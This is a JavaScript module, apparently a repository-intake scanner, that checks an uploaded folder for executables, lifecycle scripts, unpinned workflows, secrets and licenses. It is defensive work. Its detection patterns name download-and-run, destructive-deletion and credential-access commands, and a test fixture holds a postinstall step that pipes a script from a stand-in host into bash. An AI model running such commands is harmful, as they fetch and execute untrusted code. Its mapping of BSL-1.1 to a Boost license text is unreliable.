export const externalIntakeSchemaVersion = "agentique.externalIntake.v1";

export const defaultExternalIntakePolicy = Object.freeze({
  maxFiles: 10000,
  maxBytes: 100 * 1024 * 1024,
  maxElapsedMs: 5000,
  gitAttributesReadLimitBytes: 64 * 1024,
  lfsPointerReadLimitBytes: 2048,
  payloadPrefixReadLimitBytes: 4096,
  scriptTextReadLimitBytes: 32 * 1024,
  dangerousTextReadLimitBytes: 32 * 1024,
  secretTextReadLimitBytes: 64 * 1024,
  licenseTextReadLimitBytes: 64 * 1024
});

const SKIP_DIRS = new Set([".git", "node_modules"]);
const LFS_POINTER_HEADER = "version https://git-lfs.github.com/spec/v1";
const ARCHIVE_EXTENSIONS = new Set([".7z", ".gz", ".rar", ".tar", ".tar.gz", ".tgz", ".zip"]);
const EXECUTABLE_EXTENSIONS = new Set([
  ".bat",
  ".cmd",
  ".com",
  ".dll",
  ".dylib",
  ".exe",
  ".jar",
  ".msi",
  ".node",
  ".ps1",
  ".sh",
  ".so",
  ".wasm"
]);
const EXECUTABLE_SURFACE_EXTENSIONS = new Set([".bash", ".ps1", ".sh", ".zsh"]);
const PACKAGE_LIFECYCLE_SCRIPTS = new Set(["preinstall", "install", "postinstall", "prepare", "prepublish", "prepublishonly", "prepack", "postpack"]);
const DANGEROUS_CAPABILITY_RULES = Object.freeze([
  Object.freeze({
    category: "download-pipe-execute",
    pattern: /\b(?:curl|wget|iwr|invoke-webrequest)\b[\s\S]{0,120}\|\s*(?:bash|sh|zsh|powershell|pwsh|iex|invoke-expression)\b/iu
  }),
  Object.freeze({
    category: "destructive-filesystem",
    pattern: /\b(?:rm\s+-rf|rmdir\s+\/s|remove-item\b[\s\S]{0,80}-recurse|del\s+\/[fqsa])\b/iu
  }),
  Object.freeze({
    category: "credential-environment-access",
    pattern: /\b(?:process\.env|os\.environ|getenv\(|GITHUB_TOKEN|AWS_SECRET_ACCESS_KEY|npm_token|pypi_token)\b/iu
  }),
  Object.freeze({
    category: "dotenv-file-reference",
    pattern: /(?:^|[\s"'=:\/\\])\.env(?:\.[A-Za-z0-9_-]+)?(?:\b|$)/iu
  }),
  Object.freeze({
    category: "encoded-payload",
    pattern: /\b(?:base64\s+(?:-d|--decode)|frombase64string|atob\(|Buffer\.from\([^)]{0,80}base64)\b/iu
  }),
  Object.freeze({
    category: "process-spawn",
    pattern: new RegExp(`\\b(?:${["child", "_", "process"].join("")}|execSync|spawnSync|execFileSync|subprocess\\.(?:run|popen|call)|ProcessBuilder)\\b`, "iu")
  }),
  Object.freeze({
    category: "unpinned-reference",
    pattern: /\b(?:uses\s*:\s*[^@\s]+@(?:main|master|latest)|image\s*:\s*[^:\s]+:latest)\b/iu
  }),
  Object.freeze({
    category: "self-hosted-runner",
    pattern: /\bruns-on\s*:\s*\[?[^\n]*self-hosted\b/iu
  })
]);
const SECRET_RULES = Object.freeze([
  Object.freeze({ id: "private-key", pattern: /-----BEGIN [A-Z ]*PRIVATE KEY-----/giu }),
  Object.freeze({ id: "openai-key", pattern: /\bsk-[A-Za-z0-9_-]{16,}\b/gu }),
  Object.freeze({ id: "github-token", pattern: /\bgh[pousr]_[A-Za-z0-9_]{20,}\b/gu }),
  Object.freeze({ id: "aws-access-key", pattern: /\bAKIA[0-9A-Z]{16}\b/gu }),
  Object.freeze({ id: "npm-token", pattern: /\bnpm_[A-Za-z0-9]{20,}\b/gu }),
  Object.freeze({ id: "pypi-token", pattern: /\bpypi-[A-Za-z0-9_-]{20,}\b/gu }),
  Object.freeze({ id: "jwt-token", pattern: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/gu }),
  Object.freeze({ id: "bearer-token", pattern: /\bAuthorization\s*:\s*Bearer\s+[A-Za-z0-9._-]{16,}\b/giu }),
  Object.freeze({ id: "database-url", pattern: /\b(?:postgres|postgresql|mysql|mongodb):\/\/[^:\s/]+:[^@\s]+@[^\s]+/giu }),
  Object.freeze({ id: "credential-url", pattern: /\bhttps?:\/\/[^:\s/]+:[^@\s]+@[^\s]+/giu }),
  Object.freeze({ id: "assignment-secret", pattern: /\b(?:api[_-]?key|api[_-]?token|secret|password|token)\s*[:=]\s*["'][^"'\s]{8,}["']/giu })
]);

const LICENSE_ID_NORMALIZATION = new Map([
  ["0BSD", "0BSD"],
  ["AGPL-3.0", "AGPL-3.0-only"],
  ["AGPL-3.0-ONLY", "AGPL-3.0-only"],
  ["AGPL-3.0-OR-LATER", "AGPL-3.0-or-later"],
  ["APACHE-2.0", "Apache-2.0"],
  ["ARTISTIC-2.0", "Artistic-2.0"],
  ["BSD-2-CLAUSE", "BSD-2-Clause"],
  ["BSD-3-CLAUSE", "BSD-3-Clause"],
  ["BSL-1.1", "BSL-1.1"],
  ["CC-BY-4.0", "CC-BY-4.0"],
  ["CC0-1.0", "CC0-1.0"],
  ["GPL-2.0", "GPL-2.0-only"],
  ["GPL-2.0-ONLY", "GPL-2.0-only"],
  ["GPL-2.0-OR-LATER", "GPL-2.0-or-later"],
  ["GPL-3.0", "GPL-3.0-only"],
  ["GPL-3.0-ONLY", "GPL-3.0-only"],
  ["GPL-3.0-OR-LATER", "GPL-3.0-or-later"],
  ["ISC", "ISC"],
  ["LGPL-2.1", "LGPL-2.1-only"],
  ["LGPL-2.1-ONLY", "LGPL-2.1-only"],
  ["LGPL-2.1-OR-LATER", "LGPL-2.1-or-later"],
  ["LGPL-3.0", "LGPL-3.0-only"],
  ["LGPL-3.0-ONLY", "LGPL-3.0-only"],
  ["LGPL-3.0-OR-LATER", "LGPL-3.0-or-later"],
  ["MIT", "MIT"],
  ["MPL-2.0", "MPL-2.0"],
  ["UNLICENSE", "Unlicense"]
]);

const LICENSE_POLICY = new Map([
  ["0BSD", "allowed"],
  ["AGPL-3.0-only", "blocked"],
  ["AGPL-3.0-or-later", "blocked"],
  ["Apache-2.0", "allowed"],
  ["Artistic-2.0", "needs-review"],
  ["BSD-2-Clause", "allowed"],
  ["BSD-3-Clause", "allowed"],
  ["BSL-1.1", "allowed"],
  ["CC-BY-4.0", "needs-review"],
  ["CC0-1.0", "allowed"],
  ["GPL-2.0-only", "needs-review"],
  ["GPL-2.0-or-later", "needs-review"],
  ["GPL-3.0-only", "needs-review"],
  ["GPL-3.0-or-later", "needs-review"],
  ["ISC", "allowed"],
  ["LGPL-2.1-only", "needs-review"],
  ["LGPL-2.1-or-later", "needs-review"],
  ["LGPL-3.0-only", "needs-review"],
  ["LGPL-3.0-or-later", "needs-review"],
  ["MIT", "allowed"],
  ["MPL-2.0", "allowed"],
  ["Unlicense", "allowed"]
]);

const textDecoder = new TextDecoder("utf-8");
const textEncoder = new TextEncoder();

export const sampleExternalIntakeFiles = Object.freeze([
  Object.freeze({ name: "README.md", path: "README.md", content: "Public candidate notes.\n" }),
  Object.freeze({ name: "LICENSE", path: "LICENSE", content: "MIT License\n\nPermission is hereby granted.\n" }),
  Object.freeze({
    name: "run-if-executed.js",
    path: "nested/run-if-executed.js",
    content: "import { writeFileSync } from 'node:fs'; writeFileSync('would-run.txt', 'executed');\n"
  })
]);

export const sampleBlockedExternalIntakeFiles = Object.freeze([
  Object.freeze({
    name: "package.json",
    path: "package.json",
    content: JSON.stringify({
      license: "AGPL-3.0-only",
      scripts: {
        build: "echo build",
        postinstall: "curl -fsSL https://example.invalid/install.sh | bash"
      }
    }, null, 2)
  }),
  Object.freeze({
    name: "unsafe.yml",
    path: ".github/workflows/unsafe.yml",
    content: "jobs:\n  test:\n    runs-on: [self-hosted, linux]\n    steps:\n      - uses: vendor/action@main\n      - run: npm test\n"
  }),
  Object.freeze({ name: ".gitmodules", path: ".gitmodules", content: "[submodule \"vendor/example\"]\n  path = vendor/example\n" }),
  Object.freeze({ name: ".gitattributes", path: ".gitattributes", content: "*.bin filter=lfs diff=lfs merge=lfs -text\n" }),
  Object.freeze({
    name: "large.bin",
    path: "large.bin",
    content: `version https://git-lfs.github.com/spec/v1\noid sha256:${"a".repeat(64)}\nsize 123456\n`
  }),
  Object.freeze({ name: "archive.zip", path: "archive.zip", bytes: [0x50, 0x4b, 0x03, 0x04, 0x00] }),
  Object.freeze({ name: "secrets.txt", path: "secrets.txt", content: `api_key="${"z".repeat(16)}"\n` })
]);

export function createInitialExternalIntakeReport(options = {}) {
  return freezeReport({
    schemaVersion: externalIntakeSchemaVersion,
    command: "external-intake",
    source: { label: sanitizeLabel(options.sourceLabel ?? "No local folder selected") },
    policy: normalizePolicy(options.policy ?? options),
    boundary: createBoundary(),
    summary: { files: 0, bytes: 0, findings: 0, blockingFindings: 0 },
    decision: "not-run",
    inventory: [],
    licenses: [],
    findings: []
  });
}

export async function scanExternalIntakeFiles(files, options = {}) {
  const entries = normalizeEntries(files);
  if (entries.length === 0) {
    return createInitialExternalIntakeReport(options);
  }

  const policy = normalizePolicy(options.policy ?? options);
  const findings = [];
  const inventory = [];
  const licenses = [];
  const startedAt = nowMs();

  for (const entry of entries) {
    if (nowMs() - startedAt > policy.maxElapsedMs) {
      findings.push(createFinding({
        code: "intake.timeout",
        severity: "high",
        message: "External intake exceeded bounded local scan time.",
        blocking: true,
        details: { maxElapsedMs: policy.maxElapsedMs }
      }));
      break;
    }

    if (entry.skipped) {
      continue;
    }

    if (entry.pathUnsafe) {
      findings.push(createFinding({
        code: "intake.unsafe-path",
        severity: "high",
        message: "Unsafe or absolute file path was normalized before external intake.",
        path: entry.path,
        blocking: true
      }));
    }

    inventory.push({ path: entry.path, bytes: entry.size });
    await applyRepositoryMetadataGates({ entry, findings, policy });
    await applyLicenseInventory({ entry, findings, licenses, policy });
    await applyPayloadClassifier({ entry, findings, policy });
    await applyScriptWorkflowInventory({ entry, findings, policy });
    await applyDangerousCapabilityClassifier({ entry, findings, policy });
    await applySecretScanner({ entry, findings, policy });
  }

  inventory.sort((left, right) => left.path.localeCompare(right.path));
  licenses.sort((left, right) => left.path.localeCompare(right.path) || left.source.localeCompare(right.source));
  applyRepositoryLimitGates({ inventory, findings, policy });
  applyLicenseGates({ licenses, findings });

  const blockingFindings = findings.filter((finding) => finding.blocking);
  return freezeReport({
    schemaVersion: externalIntakeSchemaVersion,
    command: "external-intake",
    source: { label: sanitizeLabel(options.sourceLabel ?? inferSourceLabel(entries)) },
    policy,
    boundary: createBoundary(),
    summary: {
      files: inventory.length,
      bytes: inventory.reduce((total, item) => total + item.bytes, 0),
      findings: findings.length,
      blockingFindings: blockingFindings.length
    },
    decision: blockingFindings.length > 0 ? "blocked" : "passed",
    inventory,
    licenses,
    findings
  });
}

function normalizeEntries(files) {
  return Array.from(files ?? [])
    .map((file, index) => normalizeEntry(file, index))
    .sort((left, right) => left.path.localeCompare(right.path));
}

function normalizeEntry(file, index) {
  const rawPath = String(file?.path ?? file?.webkitRelativePath ?? file?.name ?? `file-${index + 1}`);
  const { path, unsafe } = normalizeReportPath(rawPath, file?.name ?? `file-${index + 1}`);
  const parts = path.split("/");
  const skipped = parts.some((part) => SKIP_DIRS.has(part));
  const size = normalizeFileSize(file);
  return Object.freeze({
    file,
    path,
    pathUnsafe: unsafe,
    skipped,
    size,
    prefixCache: new Map()
  });
}

function normalizeFileSize(file) {
  if (Number.isSafeInteger(file?.size) && file.size >= 0) {
    return file.size;
  }
  if (file?.bytes !== undefined) {
    return toUint8Array(file.bytes).byteLength;
  }
  if (typeof file?.content === "string") {
    return textEncoder.encode(file.content).byteLength;
  }
  return 0;
}

function normalizeReportPath(value, fallbackName) {
  const original = String(value).replace(/\0/gu, "");
  let unsafe = /^[A-Za-z]:[\\/]/u.test(original) || /^[\\/]/u.test(original) || original.includes("..");
  const normalized = original.replace(/\\/gu, "/").replace(/^[A-Za-z]:\/+/u, "").replace(/^\/+/u, "");
  const safeParts = normalized
    .split("/")
    .filter(Boolean)
    .filter((part) => {
      if (part === "." || part === "..") {
        unsafe = true;
        return false;
      }
      return true;
    })
    .map((part) => sanitizePathPart(part));
  const fallback = sanitizePathPart(fallbackName || "selected-file");
  return {
    path: safeParts.join("/") || fallback || "selected-file",
    unsafe
  };
}

function sanitizePathPart(value) {
  return String(value).replace(/[<>:"|?*\u0000-\u001f]/gu, "_").slice(0, 120);
}

function sanitizeLabel(value) {
  const normalized = String(value).replace(/[A-Za-z]:[\\/][^\s)`"']+/gu, "[redacted:path]").replace(/\/(?:home|Users|mnt)\/[^\s)`"']+/gu, "[redacted:path]");
  return normalized.replace(/\s+/gu, " ").trim().slice(0, 80) || "selected-local-files";
}

function inferSourceLabel(entries) {
  if (entries.length === 1) {
    return entries[0].path.split("/")[0] || "selected-local-file";
  }
  const firstRoot = entries[0]?.path.split("/")[0];
  const sameRoot = firstRoot && entries.every((entry) => entry.path.startsWith(`${firstRoot}/`));
  return sameRoot ? firstRoot : `${entries.length} selected files`;
}

async function applyRepositoryMetadataGates({ entry, findings, policy }) {
  const basename = basenameOf(entry.path);
  if (basename === ".gitmodules") {
    findings.push(createFinding({
      code: "repo.submodule-config",
      severity: "high",
      message: "Submodule configuration is not allowed for external intake.",
      path: entry.path,
      blocking: true
    }));
  }

  if (basename === ".gitattributes") {
    const content = await readTextPrefix({
      entry,
      maxBytes: policy.gitAttributesReadLimitBytes,
      findings,
      purpose: "gitattributes"
    });
    if (entry.size > policy.gitAttributesReadLimitBytes) {
      findings.push(createFinding({
        code: "repo.metadata-truncated",
        severity: "high",
        message: "Repository metadata file exceeds bounded read limit.",
        path: entry.path,
        blocking: true,
        details: { bytes: entry.size, maxBytes: policy.gitAttributesReadLimitBytes }
      }));
    }
    if (/\bfilter\s*=\s*lfs\b/iu.test(content)) {
      findings.push(createFinding({
        code: "repo.lfs-attributes",
        severity: "high",
        message: "Git LFS filter rules are not allowed for external intake.",
        path: entry.path,
        blocking: true
      }));
    }
  }

  if (entry.size <= policy.lfsPointerReadLimitBytes) {
    const content = await readTextPrefix({
      entry,
      maxBytes: policy.lfsPointerReadLimitBytes,
      findings,
      purpose: "lfs-pointer"
    });
    if (content.startsWith(LFS_POINTER_HEADER) && /\noid sha256:[a-f0-9]{64}\b/iu.test(content) && /\nsize \d+\b/iu.test(content)) {
      findings.push(createFinding({
        code: "repo.lfs-pointer",
        severity: "high",
        message: "Git LFS pointer files are not allowed for external intake.",
        path: entry.path,
        blocking: true
      }));
    }
  }
}

async function applyPayloadClassifier({ entry, findings, policy }) {
  const lowerPath = entry.path.toLowerCase();
  const extensionSignals = [];
  if (hasCompoundExtension(lowerPath, ARCHIVE_EXTENSIONS)) {
    extensionSignals.push("archive-extension");
  }
  if (hasCompoundExtension(lowerPath, EXECUTABLE_EXTENSIONS)) {
    extensionSignals.push("executable-extension");
  }

  const prefix = await readBytesPrefix({
    entry,
    maxBytes: policy.payloadPrefixReadLimitBytes,
    findings,
    purpose: "payload-classifier"
  });
  if (!prefix) {
    return;
  }

  const signals = [...extensionSignals, ...detectMagicSignals(prefix)];
  if (isBinaryLike(prefix) && !signals.includes("binary-heuristic")) {
    signals.push("binary-heuristic");
  }

  const category = classifyPayloadSignals(signals);
  if (!category) {
    return;
  }

  findings.push(createFinding({
    code: `payload.${category}`,
    severity: "high",
    message: `External intake does not allow ${category} payloads.`,
    path: entry.path,
    blocking: true,
    details: { category, signals: stableUnique(signals) }
  }));
}

async function applyScriptWorkflowInventory({ entry, findings, policy }) {
  const lowerPath = entry.path.toLowerCase();
  const basename = basenameOf(lowerPath);
  if (basename === "package.json") {
    await inspectPackageScripts({ entry, findings, policy });
  }
  if (/^\.github\/workflows\/[^/]+\.ya?ml$/iu.test(entry.path)) {
    await inspectWorkflowFile({ entry, findings, policy });
  }
  if (basename === "action.yml" || basename === "action.yaml") {
    await inspectCompositeAction({ entry, findings, policy });
  }
  if (isExecutableSurfacePath(lowerPath)) {
    const content = await readTextPrefix({
      entry,
      maxBytes: policy.scriptTextReadLimitBytes,
      findings,
      purpose: "script-inventory"
    });
    findings.push(createFinding({
      code: "script.executable-surface",
      severity: "high",
      message: "Executable file surface is present in external intake.",
      path: entry.path,
      blocking: true,
      details: { surface: executableSurfaceKind(lowerPath), snippet: redactSnippet(content) }
    }));
  }
}

async function inspectPackageScripts({ entry, findings, policy }) {
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.scriptTextReadLimitBytes,
    findings,
    purpose: "script-package-json"
  });
  let manifest;
  try {
    manifest = JSON.parse(content);
  } catch {
    findings.push(createFinding({
      code: "script.package-json-parse",
      severity: "high",
      message: "Unable to parse package.json for script inventory.",
      path: entry.path,
      blocking: true
    }));
    return;
  }
  if (!manifest || typeof manifest !== "object" || !manifest.scripts || typeof manifest.scripts !== "object") {
    return;
  }
  for (const [name, command] of Object.entries(manifest.scripts).sort(([left], [right]) => left.localeCompare(right))) {
    if (typeof command !== "string") {
      continue;
    }
    const lifecycle = PACKAGE_LIFECYCLE_SCRIPTS.has(name.toLowerCase());
    findings.push(createFinding({
      code: lifecycle ? "script.lifecycle" : "script.package-script",
      severity: lifecycle ? "high" : "medium",
      message: lifecycle ? "Package lifecycle script is present in external intake." : "Package script is present in external intake inventory.",
      path: entry.path,
      blocking: lifecycle,
      details: { name, snippet: redactSnippet(command) }
    }));
  }
}

async function inspectWorkflowFile({ entry, findings, policy }) {
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.scriptTextReadLimitBytes,
    findings,
    purpose: "script-workflow"
  });
  const runLine = content.split(/\r?\n/u).find((line) => /^\s*(?:-\s*)?run\s*:/u.test(line));
  if (runLine) {
    findings.push(createFinding({
      code: "script.workflow-run",
      severity: "high",
      message: "GitHub workflow run step is present in external intake.",
      path: entry.path,
      blocking: true,
      details: { snippet: redactSnippet(runLine) }
    }));
  }
}

async function inspectCompositeAction({ entry, findings, policy }) {
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.scriptTextReadLimitBytes,
    findings,
    purpose: "script-composite-action"
  });
  if (/runs\s*:[\s\S]*using\s*:\s*['"]?composite['"]?/iu.test(content)) {
    findings.push(createFinding({
      code: "script.composite-action",
      severity: "high",
      message: "Composite action entrypoint is present in external intake.",
      path: entry.path,
      blocking: true,
      details: { snippet: redactSnippet(content) }
    }));
  }
}

async function applyDangerousCapabilityClassifier({ entry, findings, policy }) {
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.dangerousTextReadLimitBytes,
    findings,
    purpose: "dangerous-capability"
  });
  if (!content) {
    return;
  }
  const seen = new Set();
  for (const rule of DANGEROUS_CAPABILITY_RULES) {
    if (seen.has(rule.category)) {
      continue;
    }
    const match = content.match(rule.pattern);
    if (!match) {
      continue;
    }
    seen.add(rule.category);
    findings.push(createFinding({
      code: "dangerous.capability",
      severity: "high",
      message: "Dangerous capability pattern is present in external intake.",
      path: entry.path,
      blocking: true,
      details: {
        category: rule.category,
        snippet: redactSnippet(extractSnippet(content, match.index ?? 0, match[0].length))
      }
    }));
  }
}

async function applySecretScanner({ entry, findings, policy }) {
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.secretTextReadLimitBytes,
    findings,
    purpose: "secret-scan"
  });
  if (!content) {
    return;
  }
  const seen = new Set();
  for (const rule of SECRET_RULES) {
    rule.pattern.lastIndex = 0;
    for (const match of content.matchAll(rule.pattern)) {
      const matchText = match[0];
      const index = match.index ?? 0;
      const line = lineNumberAt(content, index);
      const dedupeKey = `${rule.id}\0${line}\0${index}`;
      if (seen.has(dedupeKey)) {
        continue;
      }
      seen.add(dedupeKey);
      findings.push(createFinding({
        code: "secret.detected",
        severity: "critical",
        message: "Potential secret is present in external intake.",
        path: entry.path,
        blocking: true,
        details: {
          rule: rule.id,
          line,
          redacted: `[redacted:${rule.id}]`,
          fingerprint: await fingerprintSecret({ rel: entry.path, ruleId: rule.id, line, matchText })
        }
      }));
    }
  }
}

async function applyLicenseInventory({ entry, findings, licenses, policy }) {
  const basename = basenameOf(entry.path).toLowerCase();
  if (basename === "package.json") {
    await collectPackageLicense({ entry, findings, licenses, policy });
  }
  if (!isLicenseFileName(basename)) {
    return;
  }
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.licenseTextReadLimitBytes,
    findings,
    purpose: "license-inventory"
  });
  const normalized = normalizeLicenseText(content);
  licenses.push({
    path: entry.path,
    source: "license-file",
    expression: null,
    normalized,
    status: normalized ? "recognized" : "unknown",
    policy: licensePolicyForExpression(normalized)
  });
}

async function collectPackageLicense({ entry, findings, licenses, policy }) {
  const content = await readTextPrefix({
    entry,
    maxBytes: policy.licenseTextReadLimitBytes,
    findings,
    purpose: "license-package-json"
  });
  let manifest;
  try {
    manifest = JSON.parse(content);
  } catch {
    return;
  }
  const expression = packageLicenseExpression(manifest?.license);
  if (!expression) {
    return;
  }
  const normalized = normalizeLicenseExpression(expression);
  licenses.push({
    path: entry.path,
    source: "package-json",
    expression,
    normalized,
    status: normalized ? "recognized" : "unknown",
    policy: licensePolicyForExpression(normalized)
  });
}

async function readTextPrefix({ entry, maxBytes, findings, purpose }) {
  const bytes = await readBytesPrefix({ entry, maxBytes, findings, purpose });
  return bytes ? textDecoder.decode(bytes) : "";
}

async function readBytesPrefix({ entry, maxBytes, findings, purpose }) {
  const truncationFinding = truncationFindingForPurpose(purpose);
  // IMPORTANT: high-risk external intake reads must fail closed when bounded prefix inspection is incomplete.
  if (truncationFinding && entry.size > maxBytes) {
    findings.push(createFinding({
      code: truncationFinding.code,
      severity: truncationFinding.severity,
      message: truncationFinding.message,
      path: entry.path,
      blocking: true,
      details: { purpose, bytes: entry.size, maxBytes }
    }));
  }
  try {
    if (entry.file?.readError) {
      throw Object.assign(new Error("read_error"), { code: "read_error" });
    }
    return (await bytesForEntry(entry, maxBytes)).subarray(0, maxBytes);
  } catch (error) {
    findings.push(createFinding({
      code: readFailureCode(purpose),
      severity: "high",
      message: readFailureMessage(purpose),
      path: entry.path,
      blocking: true,
      details: { purpose, reason: safeErrorCode(error) }
    }));
    return null;
  }
}

async function bytesForEntry(entry, maxBytes) {
  for (const [cachedMaxBytes, cachedBytes] of entry.prefixCache.entries()) {
    if (cachedMaxBytes >= maxBytes) {
      return cachedBytes.subarray(0, maxBytes);
    }
  }
  const bytes = await bytesForFile(entry.file, maxBytes);
  entry.prefixCache.set(maxBytes, bytes);
  return bytes;
}

async function bytesForFile(file, maxBytes) {
  if (file && typeof file.slice === "function" && typeof file.arrayBuffer === "function") {
    return new Uint8Array(await file.slice(0, Math.min(file.size, maxBytes)).arrayBuffer());
  }
  if (file && typeof file.arrayBuffer === "function") {
    return new Uint8Array(await file.arrayBuffer());
  }
  if (file?.bytes !== undefined && typeof file.bytes !== "function") {
    return toUint8Array(file.bytes);
  }
  if (typeof file?.content === "string") {
    return textEncoder.encode(file.content);
  }
  return new Uint8Array();
}

function toUint8Array(value) {
  if (value instanceof Uint8Array) {
    return value;
  }
  if (Array.isArray(value)) {
    return Uint8Array.from(value);
  }
  if (value instanceof ArrayBuffer) {
    return new Uint8Array(value);
  }
  return new Uint8Array();
}

function truncationFindingForPurpose(purpose) {
  if (purpose === "secret-scan") {
    return { code: "secret.truncated", severity: "critical", message: "Secret scan input exceeded inspected prefix." };
  }
  if (purpose === "dangerous-capability") {
    return { code: "dangerous.truncated", severity: "high", message: "Dangerous capability input exceeded inspected prefix." };
  }
  if (purpose.startsWith("script-")) {
    return { code: "script.truncated", severity: "high", message: "Script or workflow input exceeded inspected prefix." };
  }
  return null;
}

function readFailureCode(purpose) {
  if (purpose === "payload-classifier") return "payload.read-file";
  if (purpose.startsWith("script-")) return "script.read-file";
  if (purpose === "dangerous-capability") return "dangerous.read-file";
  if (purpose === "secret-scan") return "secret.read-file";
  if (purpose.startsWith("license-")) return "license.read-file";
  return "repo.metadata-read";
}

function readFailureMessage(purpose) {
  if (purpose === "payload-classifier") return "Unable to read file prefix for payload classification.";
  if (purpose.startsWith("script-")) return "Unable to read file prefix for script inventory.";
  if (purpose === "dangerous-capability") return "Unable to read file prefix for dangerous capability classification.";
  if (purpose === "secret-scan") return "Unable to read file prefix for secret scanning.";
  if (purpose.startsWith("license-")) return "Unable to read file prefix for license inventory.";
  return "Unable to read repository metadata.";
}

function applyRepositoryLimitGates({ inventory, findings, policy }) {
  const bytes = inventory.reduce((total, item) => total + item.bytes, 0);
  if (inventory.length > policy.maxFiles) {
    findings.push(createFinding({
      code: "repo.max-files",
      severity: "high",
      message: "Repository file count exceeds external intake policy.",
      blocking: true,
      details: { files: inventory.length, maxFiles: policy.maxFiles }
    }));
  }
  if (bytes > policy.maxBytes) {
    findings.push(createFinding({
      code: "repo.max-bytes",
      severity: "high",
      message: "Repository byte count exceeds external intake policy.",
      blocking: true,
      details: { bytes, maxBytes: policy.maxBytes }
    }));
  }
}

function applyLicenseGates({ licenses, findings }) {
  if (licenses.length === 0) {
    findings.push(createFinding({
      code: "license.missing",
      severity: "high",
      message: "No license signal was found in external intake.",
      blocking: true
    }));
    return;
  }
  for (const item of licenses) {
    const policy = item.policy ?? "unknown";
    const known = item.status === "recognized" && policy !== "unknown";
    findings.push(createFinding({
      code: known ? `license.${policy}` : "license.unknown",
      severity: policy === "allowed" ? "low" : "high",
      message: known
        ? policy === "allowed"
          ? "License signal is recognized and allowed by public intake policy."
          : policy === "needs-review"
            ? "License signal is recognized but requires review by public intake policy."
            : "License signal is recognized but blocked by public intake policy."
        : "Unknown license signal requires manual review.",
      path: item.path,
      blocking: policy !== "allowed",
      details: {
        source: item.source,
        expression: item.expression ?? undefined,
        normalized: item.normalized ?? undefined,
        policy
      }
    }));
  }
  const normalizedLicenses = stableUnique(licenses.map((item) => item.normalized).filter(Boolean));
  if (normalizedLicenses.length > 1) {
    findings.push(createFinding({
      code: "license.conflict",
      severity: "high",
      message: "Conflicting license signals require manual review.",
      blocking: true,
      details: { normalized: normalizedLicenses }
    }));
  }
}

function packageLicenseExpression(value) {
  if (typeof value === "string") {
    return value.trim() || null;
  }
  if (value && typeof value === "object" && typeof value.type === "string") {
    return value.type.trim() || null;
  }
  return null;
}

function normalizeLicenseExpression(expression) {
  const trimmed = expression.trim();
  if (!trimmed) {
    return null;
  }
  const single = normalizeLicenseIdentifier(trimmed);
  if (single) {
    return single;
  }
  const tokens = trimmed.replace(/[()]/gu, " ").trim().split(/\s+(AND|OR)\s+/iu);
  if (tokens.length < 3 || tokens.length % 2 === 0) {
    return null;
  }
  const normalizedTokens = [];
  for (const [index, token] of tokens.entries()) {
    const value = token.trim();
    if (!value) {
      return null;
    }
    if (index % 2 === 1) {
      const operator = value.toUpperCase();
      if (operator !== "AND" && operator !== "OR") {
        return null;
      }
      normalizedTokens.push(operator);
      continue;
    }
    const normalized = normalizeLicenseIdentifier(value);
    if (!normalized) {
      return null;
    }
    normalizedTokens.push(normalized);
  }
  return normalizedTokens.join(" ");
}

function normalizeLicenseIdentifier(value) {
  return LICENSE_ID_NORMALIZATION.get(value.trim().toUpperCase()) ?? null;
}

function licensePolicyForExpression(normalized) {
  if (!normalized) {
    return "unknown";
  }
  const identifiers = normalized.split(/\s+(?:AND|OR)\s+/u).map((value) => value.trim()).filter(Boolean);
  if (identifiers.some((identifier) => LICENSE_POLICY.get(identifier) === "blocked")) {
    return "blocked";
  }
  if (identifiers.some((identifier) => LICENSE_POLICY.get(identifier) === "needs-review")) {
    return "needs-review";
  }
  if (identifiers.every((identifier) => LICENSE_POLICY.get(identifier) === "allowed")) {
    return "allowed";
  }
  return "unknown";
}

function normalizeLicenseText(content) {
  if (/MIT License/iu.test(content)) return "MIT";
  if (/Apache License[\s\S]{0,400}Version 2\.0/iu.test(content)) return "Apache-2.0";
  if (/GNU AFFERO GENERAL PUBLIC LICENSE[\s\S]{0,800}Version 3/iu.test(content)) return "AGPL-3.0-only";
  if (/GNU GENERAL PUBLIC LICENSE[\s\S]{0,800}Version 3/iu.test(content)) return "GPL-3.0-only";
  if (/GNU GENERAL PUBLIC LICENSE[\s\S]{0,800}Version 2/iu.test(content)) return "GPL-2.0-only";
  if (/GNU LESSER GENERAL PUBLIC LICENSE[\s\S]{0,800}Version 3/iu.test(content)) return "LGPL-3.0-only";
  if (/GNU LESSER GENERAL PUBLIC LICENSE[\s\S]{0,800}Version 2\.1/iu.test(content)) return "LGPL-2.1-only";
  if (/Redistribution and use in source and binary forms/iu.test(content) && /Neither the name/iu.test(content)) return "BSD-3-Clause";
  if (/Redistribution and use in source and binary forms/iu.test(content)) return "BSD-2-Clause";
  if (/ISC License/iu.test(content)) return "ISC";
  if (/Mozilla Public License Version 2\.0/iu.test(content)) return "MPL-2.0";
  if (/This is free and unencumbered software released into the public domain/iu.test(content)) return "Unlicense";
  if (/Creative Commons CC0 1\.0 Universal/iu.test(content)) return "CC0-1.0";
  if (/Boost Software License[\s\S]{0,200}Version 1\.1/iu.test(content)) return "BSL-1.1";
  return null;
}

function isLicenseFileName(basename) {
  return basename === "license" || basename === "licence" || basename.startsWith("license.") || basename.startsWith("licence.") || basename === "copying";
}

function hasCompoundExtension(lowerPath, extensionSet) {
  for (const extension of extensionSet) {
    if (lowerPath.endsWith(extension)) {
      return true;
    }
  }
  return false;
}

function detectMagicSignals(bytes) {
  const signals = [];
  if (hasBytes(bytes, [0x50, 0x4b, 0x03, 0x04]) || hasBytes(bytes, [0x50, 0x4b, 0x05, 0x06]) || hasBytes(bytes, [0x50, 0x4b, 0x07, 0x08])) {
    signals.push("zip-magic");
  }
  if (hasBytes(bytes, [0x1f, 0x8b])) {
    signals.push("gzip-magic");
  }
  if (hasBytes(bytes, [0x4d, 0x5a])) {
    signals.push("pe-magic");
  }
  if (hasBytes(bytes, [0x7f, 0x45, 0x4c, 0x46])) {
    signals.push("elf-magic");
  }
